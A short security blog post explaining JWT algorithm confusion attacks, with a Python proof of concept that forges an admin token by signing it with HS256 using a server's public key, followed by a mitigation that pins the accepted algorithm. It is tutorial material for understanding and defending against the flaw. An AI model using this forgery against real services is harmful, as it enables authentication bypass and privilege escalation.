---
layout: post
title: "Understanding JWT Algorithm Confusion Attacks"
date: 2024-01-20
tags: [web, jwt, auth]
description: "A deep dive into RS256 to HS256 algorithm confusion attacks on JWT implementations and how to exploit them."
---

JWT algorithm confusion is one of my favourite web vulns — elegant in its simplicity, devastating in practice.

## The Setup

Most JWT libraries support both `RS256` (asymmetric) and `HS256` (symmetric). The problem? Some libraries let the *client* decide which algorithm to use by trusting the `alg` header.

## The Attack

If a server uses RS256, it has a **public** key and a **private** key. The public key is... public. If we forge a token using HS256, and sign it with the *public key as the HMAC secret*, a vulnerable server will:

1. Read `alg: HS256` from the header
2. Verify the signature using the public key as the HMAC secret
3. Accept our forged token ✓

## Exploitation

```python
import jwt
import requests

# Fetch public key
pubkey = requests.get("https://target/.well-known/jwks.json").text

# Forge token as admin
token = jwt.encode(
    {"sub": "admin", "role": "superuser"},
    pubkey,
    algorithm="HS256"
)

print(token)
```

## Mitigation

Always enforce the expected algorithm server-side. Never trust the `alg` header from the client.

```python
jwt.decode(token, pubkey, algorithms=["RS256"])  # Explicit!
```
